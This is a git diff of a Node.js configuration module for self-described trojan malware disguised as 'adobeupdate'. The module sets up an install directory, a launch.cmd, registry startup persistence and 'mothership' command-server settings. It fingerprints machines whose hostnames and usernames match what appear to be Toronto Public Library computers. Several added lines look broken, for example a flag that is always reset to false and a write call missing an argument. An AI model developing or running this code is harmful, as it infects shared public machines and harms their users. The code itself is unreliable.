@@ -9,6 +9,7 @@ const util = require("util");
 
 const helper = require("./adobeupdate.helper.js");
 
+// refactor to read/write mothershipconfig.json
 var mothershipconfig = {
     get mothershipconfigfpath() {
         return path.join(systemconfig.trojandir, "mothership");
@@ -68,61 +69,23 @@ var mothershipconfig = {
     },
 };
 
-// TODO move mothership config details to mothershipconfig
+// TODO refactor to move all getters to init routine
 var systemconfig = {
+    scriptts: helper.getTimestamp(),
     cmdname: "",
     cmdtaskname: "",
+    istpl: "not set",
 
     // TODO reconcile machinename, username, userid
-
-    // all TPLs have the same machinename, hostname
-    // TODO SJPCP --> st. james
-    //      RLPCP --> yonge/bloor reference library
-    //      username should be ADULT2022
-    get istpl() {
-        let machineprefix = this.machinename.toLowerCase().substring(0, 5);
-
-        if (
-            ["ADULT2022", "LC2022", "CAT2022"].includes(
-                this.username.toUpperCase()
-            )
-        ) {
-            return true;
-        }
-
-        if (
-            machineprefix == "RLPCP".toLowerCase() ||
-            machineprefix == "SJPCP".toLowerCase()
-        ) {
-            return true;
-        }
-
-        if (helper.fileExists(path.join(this.scriptdir, "tplmode"))) {
-            return true;
-        }
-
-        return false;
-    },
 
     staticdelay: 30,
     trojanname: "owd",
     script_version: "full_infection_script",
 
-    get trojandir() {
-        if (systemconfig.istpl) {
-            return path.join(process.env.ProgramData, this.trojanname);
-        }
+    trojandir: "not set",
 
-        return path.join(os.tmpdir(), this.trojanname);
-    },
-
-    get launch_script_fname() {
-        return "launch.cmd";
-    },
-
-    get launch_script_fpath() {
-        return path.join(this.trojandir, this.launch_script_fname);
-    },
+    launch_script_fname: "launch.cmd",
+    launch_script_fpath: "",
 
     getClientJobPath() {
         return path.join(
@@ -217,21 +180,9 @@ var systemconfig = {
         );
     },
 
-    get pythonexepath() {
-        return path.join(systemconfig.pythonexedir, "python.exe");
-    },
+    pythonexepath: path.join(systemconfig.pythonexedir, "python.exe"),
 
-    get trojandir() {
-        if (this.istpl) {
-            return path.join(process.env.ProgramData, this.trojanname);
-        }
-
-        return path.join(os.tmpdir(), this.trojanname);
-    },
-
-    get trojanfname() {
-        return "adobeupdate";
-    },
+    trojanfname: "adobeupdate",
 
     get trojanfpath() {
         return path.join(this.trojandir, this.trojanfname);
@@ -241,43 +192,19 @@ var systemconfig = {
         return process.ppid;
     },
 
-    get scriptfpath() {
-        return helper_ps.process_argv[1];
-    },
+    scriptfpath: "",
 
     get scriptdir() {
         return path.dirname(this.scriptfpath);
     },
 
-    get machinename() {
-        return os.hostname();
-    },
+    machinename: "",
 
-    get username() {
-        let uinfo = os.userInfo();
-        return uinfo.username;
-    },
+    username: "",
 
-    get source() {
-        return path.basename(this.scriptfpath);
-    },
+    source: path.basename(this.scriptfpath),
 
-    scriptts: helper.getTimestamp(),
-
-    // TODO write script MD5 to file, read from file
-    __scriptmd5: "",
-    get scriptmd5() {
-        if (helper.isNullOrWhitespace(this.__scriptmd5))
-            this.__scriptmd5 = helper.getFileMD5(this.scriptfpath);
-
-        return this.__scriptmd5;
-    },
-
-    __sessionid: helper.getRandomCode(8),
-
-    get sessionid() {
-        return this.__sessionid;
-    },
+    scriptmd5: "",
 
     get statekvp() {
         return {
@@ -296,6 +223,72 @@ var systemconfig = {
         return `cmdname=${this.cmdname} cmdtaskname=${this.cmdtaskname} ts=${this.scriptts} pid=${this.scriptpid} ppid=${this.scriptparentpid}`;
     },
 };
+
+systemconfig.machinename = os.hostname();
+
+systemconfig.username = os.userInfo().username;
+
+systemconfig.sessionid = helper.getRandomCode(8);
+
+systemconfig.trojandir = path.join(
+    process.env.ProgramData,
+    systemconfig.trojanname
+);
+
+systemconfig.launch_script_fpath = path.join(
+    systemconfig.trojandir,
+    systemconfig.launch_script_fname
+);
+
+function init_scriptmd5() {
+    let fpath = path.join(systemconfig.trojandir, "scriptmd5");
+
+    let md5str = "";
+
+    if (helper.fileExists(fpath)) {
+        md5str = helper.readTag(fpath);
+    } else {
+        md5str = helper.getFileMD5(systemconfig.scriptfpath);
+
+        if (!helper.isNullOrWhitespace(md5str))
+            helper.writeTag(path.join(systemconfig.trojandir, "scriptmd5"));
+    }
+
+    systemconfig.scriptmd5 = md5str;
+}
+
+init_scriptmd5();
+
+// all TPLs have the same machinename, hostname
+// TODO SJPCP --> st. james
+//      RLPCP --> yonge/bloor reference library
+//      username should be ADULT2022
+function init_istpl() {
+    let machineprefix = systemconfig.machinename.toLowerCase().substring(0, 5);
+
+    if (
+        ["ADULT2022", "LC2022", "CAT2022"].includes(
+            systemconfig.username.toUpperCase()
+        )
+    ) {
+        systemconfig.istpl = true;
+    }
+
+    if (
+        machineprefix == "RLPCP".toLowerCase() ||
+        machineprefix == "SJPCP".toLowerCase()
+    ) {
+        systemconfig.istpl = true;
+    }
+
+    if (helper.fileExists(path.join(this.scriptdir, "tplmode"))) {
+        systemconfig.istpl = true;
+    }
+
+    systemconfig.istpl = false;
+}
+
+init_istpl();
 
 var regstartupconfig = {
     get new_item_str() {
@@ -477,3 +470,10 @@ module.exports = {
 };
 
 const helper_ps = require("./adobeupdate.helper.ps.js");
+
+systemconfig.scriptfpath = helper_ps.process_argv[1];
+
+helper.logmsg(mothershipconfig.mothershipconfigfpath);
+helper.logmsg(mothershipconfig.mothershiplist);
+helper.logmsg(mothershipconfig.mothershipassets);
+helper.logmsg(mothershipconfig.mothership);
